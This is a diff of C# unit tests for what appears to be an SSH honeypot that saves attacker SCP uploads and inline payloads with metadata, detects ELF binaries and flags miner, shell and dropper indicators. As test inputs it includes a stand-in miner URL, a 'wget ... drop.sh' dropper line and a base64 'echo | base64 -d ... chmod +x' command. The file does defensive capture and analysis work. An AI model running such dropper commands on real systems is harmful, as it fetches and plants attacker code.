@@ -123,21 +123,43 @@ public class SCPDetectorTests
 public class SCPUploadSessionTests
 {
     [Fact]
-    public void HandleData_CapturesBinaryUploadToLogDirectory()
+    public void HandleData_CapturesBinaryUploadWithMetadataAndAnalysis()
     {
         var previousLogDir = Program.LogDir;
+        var previousAppDir = Program.AppDir;
         var tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));
         Program.LogDir = tempDir;
+        Program.AppDir = tempDir;
 
         try
         {
-            var session = new SCPUploadSession("abcdef123456", "fallback.bin");
+            var context = new BinaryUploadContext(
+                SessionKey: "abcdef1234567890",
+                ShellSessionId: "shell-001",
+                RemoteEndpoint: "203.0.113.42:54321",
+                RemoteIp: "203.0.113.42",
+                Username: "root",
+                ClientVersion: "SSH-2.0-OpenSSH_9.2p1",
+                SshBanner: "SSH-2.0-OmegaBlack_Classified_Server_v1.0",
+                DeliveryChannel: "exec",
+                CommandText: "scp -t /tmp/payload.bin",
+                ExchangeId: "abcdef1234567890:000001");
+
+            var session = new SCPUploadSession("abcdef1234567890", "fallback.bin", context);
             var acks = new List<byte[]>();
             var closeReasons = new List<string>();
-            var payload = new byte[] { 0, 1, 2, 255, 10 };
-            var packet = new byte["C0644 5 payload.bin\n"u8.Length + payload.Length + 1];
-            "C0644 5 payload.bin\n"u8.CopyTo(packet);
-            payload.CopyTo(packet.AsSpan("C0644 5 payload.bin\n"u8.Length));
+            // Minimal 64-bit LSB x86-64 ELF header + indicator string
+            var payload = new byte[]
+            {
+                0x7F, (byte)'E', (byte)'L', (byte)'F', 0x02, 0x01, 0x01, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x02, 0x00, 0x3E, 0x00
+            }.Concat(System.Text.Encoding.ASCII.GetBytes("http://198.51.100.7/xmrig\0/bin/sh\0")).ToArray();
+
+            var headerBytes = System.Text.Encoding.ASCII.GetBytes($"C0755 {payload.Length} payload.bin\n");
+            var packet = new byte[headerBytes.Length + payload.Length + 1];
+            headerBytes.CopyTo(packet, 0);
+            payload.CopyTo(packet.AsSpan(headerBytes.Length));
             packet[^1] = 0;
 
             session.HandleData(packet, acks.Add, closeReasons.Add);
@@ -149,39 +171,178 @@ public class SCPUploadSessionTests
             var uploadDir = Path.Combine(tempDir, "uploads", "abcdef12");
             var path = Assert.Single(Directory.GetFiles(uploadDir, "*_payload.bin"));
             Assert.Equal(payload, File.ReadAllBytes(path));
+
+            var metaPath = path + ".meta.json";
+            Assert.True(File.Exists(metaPath));
+            var metadata = System.Text.Json.JsonSerializer.Deserialize<BinaryUploadMetadataRecord>(File.ReadAllText(metaPath));
+            Assert.NotNull(metadata);
+            Assert.Equal("abcdef1234567890", metadata!.SessionId);
+            Assert.Equal("shell-001", metadata.ShellSessionId);
+            Assert.Equal("abcdef1234567890:000001", metadata.ExchangeId);
+            Assert.Equal("203.0.113.42:54321", metadata.RemoteEndpoint);
+            Assert.Equal("203.0.113.42", metadata.RemoteIp);
+            Assert.Equal("root", metadata.Username);
+            Assert.Equal("SSH-2.0-OpenSSH_9.2p1", metadata.ClientVersion);
+            Assert.Equal("scp -t /tmp/payload.bin", metadata.CommandText);
+            Assert.Equal("C0755", metadata.ScpPermissions);
+            Assert.Equal("captured", metadata.Status);
+            Assert.Equal(payload.Length, metadata.CapturedBytes);
+            Assert.Equal("ELF 64-bit LSB", metadata.Analysis.FileFormat);
+            Assert.Equal("x86-64", metadata.Analysis.Architecture);
+            Assert.Equal("executable", metadata.Analysis.BinaryType);
+            Assert.True(metadata.Analysis.IsExecutable);
+            Assert.Contains("http://198.51.100.7/xmrig", metadata.Analysis.ExtractedUrls);
+            Assert.Contains("198.51.100.7", metadata.Analysis.ExtractedIpAddresses);
+            Assert.Contains("crypto-miner:xmrig", metadata.Analysis.SuspiciousIndicators);
+            Assert.Contains("shell-execution:/bin/sh", metadata.Analysis.SuspiciousIndicators);
         }
         finally
         {
             Program.LogDir = previousLogDir;
+            Program.AppDir = previousAppDir;
             if (Directory.Exists(tempDir))
                 Directory.Delete(tempDir, recursive: true);
         }
     }
 
     [Fact]
-    public void HandleData_RejectsUploadsLargerThanFiveMegabytes()
+    public void HandleData_RejectsAndSavesUploadsLargerThanFiveMegabytesWithMetadata()
     {
         var previousLogDir = Program.LogDir;
+        var previousAppDir = Program.AppDir;
         var tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));
         Program.LogDir = tempDir;
+        Program.AppDir = tempDir;
 
         try
         {
-            var session = new SCPUploadSession("abcdef123456", "fallback.bin");
+            var context = new BinaryUploadContext(
+                SessionKey: "abcdef123456",
+                ShellSessionId: "shell-oversized",
+                RemoteEndpoint: "198.51.100.99:2222",
+                RemoteIp: "198.51.100.99",
+                Username: "admin",
+                ClientVersion: "SSH-2.0-libssh2_1.10.0",
+                CommandText: "scp -t /tmp/big.bin");
+            var session = new SCPUploadSession("abcdef123456", "fallback.bin", context);
             var closeReasons = new List<string>();
-            var header = $"C0644 {SCPUploadHandler.MaxUploadBytes + 1} payload.bin\n";
+            var header = System.Text.Encoding.ASCII.GetBytes($"C0644 {SCPUploadHandler.MaxUploadBytes + 1024} payload.bin\n");
+            var sample = System.Text.Encoding.ASCII.GetBytes("#!/bin/sh\nwget http://198.51.100.99/drop.sh -O /tmp/d.sh\n");
+            var packet = header.Concat(sample).ToArray();
 
-            session.HandleData(System.Text.Encoding.ASCII.GetBytes(header), _ => { }, closeReasons.Add);
+            session.HandleData(packet, _ => { }, closeReasons.Add);
 
             Assert.Equal("SCPUploadTooLarge", Assert.Single(closeReasons));
-            Assert.False(Directory.Exists(Path.Combine(tempDir, "uploads", "abcdef12")));
+            var uploadDir = Path.Combine(tempDir, "uploads", "abcdef12");
+            Assert.True(Directory.Exists(uploadDir));
+            var savedFile = Assert.Single(Directory.GetFiles(uploadDir, "*_payload.bin"));
+            Assert.Equal(sample, File.ReadAllBytes(savedFile));
+
+            var metaPath = savedFile + ".meta.json";
+            Assert.True(File.Exists(metaPath));
+            var metadata = System.Text.Json.JsonSerializer.Deserialize<BinaryUploadMetadataRecord>(File.ReadAllText(metaPath));
+            Assert.NotNull(metadata);
+            Assert.Equal("too_large_saved", metadata!.Status);
+            Assert.Equal("too_large", metadata.RejectionReason);
+            Assert.True(metadata.Truncated);
+            Assert.Equal(SCPUploadHandler.MaxUploadBytes + 1024, metadata.ExpectedBytes);
+            Assert.Equal(sample.Length, metadata.CapturedBytes);
+            Assert.Equal("198.51.100.99", metadata.RemoteIp);
+            Assert.Equal("#!/bin/sh", metadata.Analysis.Shebang);
+            Assert.Contains("dropper:wget", metadata.Analysis.SuspiciousIndicators);
         }
         finally
         {
             Program.LogDir = previousLogDir;
+            Program.AppDir = previousAppDir;
             if (Directory.Exists(tempDir))
                 Directory.Delete(tempDir, recursive: true);
         }
+    }
+
+    [Fact]
+    public void CaptureUpload_SavesRejectedInlineBinaryWithSessionMetadataAndAnalysis()
+    {
+        var previousLogDir = Program.LogDir;
+        var previousAppDir = Program.AppDir;
+        var tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));
+        Program.LogDir = tempDir;
+        Program.AppDir = tempDir;
+
+        try
+        {
+            var context = new BinaryUploadContext(
+                SessionKey: "9988776655443322",
+                ShellSessionId: "pty-session-42",
+                RemoteEndpoint: "192.0.2.55:41111",
+                RemoteIp: "192.0.2.55",
+                Username: "remote",
+                ClientVersion: "SSH-2.0-Go",
+                SshBanner: "SSH-2.0-OmegaBlack",
+                DeliveryChannel: "pty",
+                CommandText: "\u007fELF\0binary-drop",
+                ExchangeId: "9988776655443322:000003");
+
+            var rawPayload = new byte[] { 0x7F, (byte)'E', (byte)'L', (byte)'F', 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x28, 0x00 };
+            var savedPath = SCPUploadHandler.CaptureUpload(
+                context.SessionKey,
+                "inline_000003.bin",
+                rawPayload,
+                context,
+                source: "ssh_pty_binary",
+                rejectionReason: "Binary content not allowed");
+
+            Assert.True(File.Exists(savedPath));
+            Assert.Equal(rawPayload, File.ReadAllBytes(savedPath));
+
+            var metaPath = savedPath + ".meta.json";
+            Assert.True(File.Exists(metaPath));
+            var meta = System.Text.Json.JsonSerializer.Deserialize<BinaryUploadMetadataRecord>(File.ReadAllText(metaPath));
+            Assert.NotNull(meta);
+            Assert.Equal("rejected_saved", meta!.Status);
+            Assert.Equal("Binary content not allowed", meta.RejectionReason);
+            Assert.Equal("ssh_pty_binary", meta.Source);
+            Assert.Equal("9988776655443322", meta.SessionId);
+            Assert.Equal("pty-session-42", meta.ShellSessionId);
+            Assert.Equal("9988776655443322:000003", meta.ExchangeId);
+            Assert.Equal("192.0.2.55:41111", meta.RemoteEndpoint);
+            Assert.Equal("ELF 32-bit LSB", meta.Analysis.FileFormat);
+            Assert.Equal("ARM", meta.Analysis.Architecture);
+
+            var publishedBinariesPath = Path.Combine(tempDir, "frontend", "data", "binaries.json");
+            Assert.True(File.Exists(publishedBinariesPath));
+            var published = SCPUploadHandler.ReadBinaryUploadsFile(publishedBinariesPath);
+            var publishedEntry = Assert.Single(published);
+            Assert.Equal("9988776655443322", publishedEntry.SessionId);
+            Assert.Equal("ELF 32-bit LSB", publishedEntry.Analysis.FileFormat);
+        }
+        finally
+        {
+            Program.LogDir = previousLogDir;
+            Program.AppDir = previousAppDir;
+            if (Directory.Exists(tempDir))
+                Directory.Delete(tempDir, recursive: true);
+        }
+    }
+
+    [Fact]
+    public void TryExtractInlineEncodedPayload_ExtractsBase64AndHexPayloads()
+    {
+        var raw = new byte[] { 0x7F, (byte)'E', (byte)'L', (byte)'F', 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+        var b64 = Convert.ToBase64String(raw);
+        var cmd = $"echo '{b64}' | base64 -d > /tmp/dropper.elf && chmod +x /tmp/dropper.elf";
+
+        Assert.True(SCPUploadHandler.TryExtractInlineEncodedPayload(cmd, out var filename, out var decoded, out var source));
+        Assert.Equal("dropper.elf", filename);
+        Assert.Equal("inline_base64", source);
+        Assert.Equal(raw, decoded);
+
+        var hexCmd = @"echo -ne '\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00' > /dev/shm/a.bin";
+        Assert.True(SCPUploadHandler.TryExtractInlineEncodedPayload(hexCmd, out var hexName, out var hexBytes, out var hexSource));
+        Assert.Equal("a.bin", hexName);
+        Assert.Equal("inline_hex_escape", hexSource);
+        Assert.Equal(12, hexBytes.Length);
+        Assert.Equal(0x7F, hexBytes[0]);
     }
 }
 
@@ -840,7 +1001,9 @@ public class CommandResolverTests
         {
             var value = entry.Value.GetProperty("response").GetString() ?? "";
             Assert.True(value == "96" || value.Contains("CPUS:96", StringComparison.Ordinal) || value.EndsWith("|96", StringComparison.Ordinal));
-            Assert.Equal("seed", entry.Value.GetProperty("origin").GetString());
+            // Production learns into this bind-mounted file after deployment.
+            // Valid runtime additions are llm-origin, not regenerated seed entries.
+            Assert.Contains(entry.Value.GetProperty("origin").GetString(), new[] { "seed", "llm" });
         }
 
         var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
